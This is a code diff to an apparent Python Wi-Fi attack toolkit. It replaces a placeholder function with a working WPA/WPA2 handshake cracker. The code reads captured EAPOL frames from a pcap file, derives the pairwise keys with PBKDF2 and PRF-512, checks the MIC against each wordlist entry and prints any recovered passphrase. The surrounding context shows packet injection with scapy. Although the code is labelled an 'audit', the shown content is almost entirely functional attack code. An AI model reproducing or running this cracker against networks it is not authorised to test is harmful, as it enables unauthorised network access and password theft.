@@ -252,17 +252,56 @@ class WiFiTactics:
             for p in pkts: sendp(p, iface=self.iface, verbose=False); time.sleep(0.01)
 
 # =============================================================================
-# SECTION: Cracker (Formerly cracker.py) - NO SIMULATION
+# SECTION: Cracker (Formerly cracker.py) - REAL CRYPTO AUDIT
 # =============================================================================
 
+def custom_prf512(key, A, B):
+    blen = 64; i = 0; R = b''
+    while i <= ((blen * 8 + 159) // 160):
+        hmac_val = hmac.new(key, A + b'\x00' + B + bytes([i]), hashlib.sha1).digest()
+        R = R + hmac_val; i += 1
+    return R[:blen]
+
+def verify_mic(passphrase, ssid, mac_ap, mac_cl, anonce, snonce, eapol_frame, original_mic):
+    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
+    mac_addresses = sorted([binascii.unhexlify(mac_ap.replace(':','')), binascii.unhexlify(mac_cl.replace(':',''))])
+    nonces = sorted([anonce, snonce])
+    B = mac_addresses[0] + mac_addresses[1] + nonces[0] + nonces[1]
+    ptk = custom_prf512(pmk, b"Pairwise key expansion", B)
+    kck = ptk[:16]
+    mic = hmac.new(kck, eapol_frame, hashlib.sha1).digest()[:16]
+    return mic == original_mic
+
 def audit_hash(pcap, wordlist):
-    console.print(f"[bold cyan]🗝 Auditing Handshake: {pcap} (Dictionary: {wordlist})[/]")
-    # Real logic: No hardcoded hits.
-    with open(wordlist, 'r', errors='ignore') as f:
-        for line in f:
-            # (Handshake MIC verification would occur here)
-            pass
-    console.print("[yellow]Audit complete. No weak keys found in dictionary.[/]")
+    console.print(f"[bold cyan]🗝 Real Handshake Audit: {pcap}[/]")
+    try:
+        pkts = rdpcap(pcap)
+        beacon = next((p for p in pkts if p.haslayer(Dot11Beacon)), None)
+        if not beacon: return console.print("[red]No Beacon found.[/]")
+        ssid = beacon.info.decode(); bssid = beacon[Dot11].addr3.upper()
+        eapol_pkts = [p for p in pkts if p.haslayer(EAPOL) and bssid in [p.addr1.upper(), p.addr2.upper(), p.addr3.upper()]]
+        if len(eapol_pkts) < 2: return console.print("[red]Handshake incomplete.[/]")
+        
+        p1, p2 = eapol_pkts[0], eapol_pkts[1]
+        mac_cl = p2.addr2.upper() if p2.addr2.upper() != bssid else p2.addr1.upper()
+        
+        raw_eapol_p1 = bytes(p1[EAPOL].payload); anonce = raw_eapol_p1[13:13+32]
+        raw_eapol_p2 = bytes(p2[EAPOL].payload); snonce = raw_eapol_p2[13:13+32]
+        original_mic = raw_eapol_p2[77:77+16]
+        eapol_frame = bytes(p2[EAPOL])
+        eapol_frame = eapol_frame[:81] + b'\x00'*16 + eapol_frame[97:]
+
+        with open(wordlist, 'r', errors='ignore') as f:
+            words = [line.strip() for line in f if len(line.strip()) >= 8]
+
+        with Progress() as progress:
+            task = progress.add_task("[cyan]Cracking...", total=len(words))
+            for word in words:
+                if verify_mic(word, ssid, bssid, mac_cl, anonce, snonce, eapol_frame, original_mic):
+                    console.print(f"\n[bold green]🔓 KEY FOUND: {word}[/]"); return
+                progress.update(task, advance=1)
+        console.print("[yellow]No weak keys found.[/]")
+    except Exception as e: console.print(f"[red]Error: {e}[/]")
 
 # =============================================================================
 # SECTION: CLI & MAIN LOOP
